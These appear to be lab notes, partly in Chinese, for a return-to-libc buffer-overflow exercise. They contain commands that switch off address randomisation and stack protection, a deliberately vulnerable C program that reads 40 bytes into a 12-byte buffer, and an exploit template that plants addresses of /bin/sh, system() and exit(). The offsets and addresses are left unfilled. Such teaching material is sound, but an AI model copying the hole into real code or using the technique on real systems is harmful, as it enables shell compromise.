# Return to Libc Attack Lab

## 2 Lab Tasks

### 2.1 Turning off Countermeasures

`Address Space Randomization`: `$ sudo sysctl -w kernel.randomize_va_space=0`

`The StackGuard Protector Scheme`: `$ gcc -fno-stack-protector `

### 2.2 The Vulnerable Program

```c
/* retlib.c */
/* This program has a buffer overflow vulnerability. */
/* Our task is to exploit this vulnerability */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int bof(FILE *badfile)
{
	char buffer[12];
	/* The following statement has a buffer overflow problem */
	fread(buffer, sizeof(char), 40, badfile);
	return 1;
}
int main(int argc, char **argv)
{
	FILE *badfile;
	badfile = fopen("badfile", "r");
	bof(badfile);
	printf("Returned Properly\n");
	fclose(badfile);
	return 1;
}
```

### 2.3 Task 1: Finding out the addresses of libc functions

**using gdb**

### 2.4 Task 2: Putting the shell string in the memory

想要执行system函数，需要先给他传参数。这里采用环境变量的方法来进行此项操作，在shell中执行程序，shell会创建子进程来运行程序，而子进程继承shell所有的环境变量。通过以下方式验证。

设置环境变量

```shell
$ export MYSHELL=/bin/sh
$ env | grep MYSHELL
MYSHELL=/bin/sh
```

此环境变量的地址可以通过以下程序获得

```c
void main()
{
    char *shell = getenv("MYSHELL");
    if (shell)
        printf("%x\n", (unsigned int)shell)
}
```

如果关闭了地址随机化，每次都会得到一样的地址。然后在retlib程序中，此环境变量的地址并不一定是一样的。当你改变程序的名字时（改变字符个数），此地址会发生改变。好消息是，真实的地址就在这个地址附近。在gdb中，环境变量的地址也不一样。

### Task 3: Exploiting the Buffer-Overflow Vulnerability

```c
/* exploit.c */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
    char buf[40];
    FILE *badfile;
    
    badfile = fopen("./badfile", "w");
	/* You need to decide the addresses and
	the values for X, Y, Z. The order of the following
	three statements does not imply the order of X, Y, Z.
	Actually, we intentionally scrambled the order. */
	*(long *) &buf[X] = some address ; // "/bin/sh" ✰
	*(long *) &buf[Y] = some address ; // system() ✰
	*(long *) &buf[Z] = some address ; // exit() ✰
	fwrite(buf, sizeof(buf), 1, badfile);
	fclose(badfile);
    
    return 0;
}
```

### Task 4: Turning on Address Randomization

开启了地址随机化后，system地址，环境变量的地址均发生变化。